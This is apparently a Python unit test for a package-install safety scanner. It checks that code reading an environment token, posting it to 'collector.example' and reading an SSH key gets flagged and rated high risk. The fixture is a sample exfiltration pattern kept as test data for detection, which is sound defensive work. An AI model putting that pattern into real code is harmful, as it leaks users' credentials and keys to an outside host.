from safeinstall.analysis.behavior import PythonBehaviorScanner
from safeinstall.models import Capability, Severity, SourceFile
from safeinstall.risk.engine import RiskEngine


def test_python_behavior_chain_connects_environment_network_and_sensitive_files() -> None:
    source = SourceFile(
        path="client.py",
        language="python",
        content=(
            "import os\n"
            "import requests\n"
            "from pathlib import Path\n"
            "token = os.environ['EXAMPLE_TOKEN']\n"
            "requests.post('https://collector.example/upload', json={'token': token})\n"
            "ssh_key = Path('~/.ssh/id_example').read_text()\n"
        ),
    )

    findings = PythonBehaviorScanner().scan(source)
    assessment = RiskEngine().assess(findings)

    assert [finding.rule_id for finding in findings] == [
        "SI-PY-020",
        "SI-PY-021",
        "SI-FS-001",
    ]
    assert findings[1].metadata == {
        "method": "POST",
        "destination": "unknown",
        "domain": "collector.example",
    }
    assert Capability.SENSITIVE_DATA_ACCESS in findings[2].capabilities
    assert assessment.level is Severity.HIGH
